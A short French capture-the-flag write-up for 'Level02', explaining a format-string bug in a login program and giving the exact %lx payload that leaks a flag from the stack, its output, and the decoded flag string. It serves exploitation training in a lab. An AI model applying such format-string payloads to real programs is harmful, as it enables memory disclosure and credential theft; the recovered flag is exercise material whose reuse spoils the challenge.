# Level02

On observe que l'executable prend une entre sur l'entre standard

```shell
$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: Hello
--[ Password: World
*****************************************
Hello does not have access!
```

On remarque un `printf(&name)` de notre username et que le `flag` est lu et stocke
juste avant notre variable `name` sur la stack. On cherche alors a l'afficher grace
au `%x` de printf.

On remarque aussi que l'executable est en `64 bits` grace au nom des registres:
`rax`, `rbx`, `rcx` et `rdx`. Il faut alors utiler `%lx` au lieux de `%x`

```shell
$ python -c 'print("AAAABBBB %21$lx %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx %28$lx")' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAABBBB 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 4242424241414141 does not have access!
```

On connait notre flag stocke maintenant. Plus qu'a le convertir en hexa

```shell
$ python -c 'print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1] + "\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1] + "\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1] + "\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1] + "\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
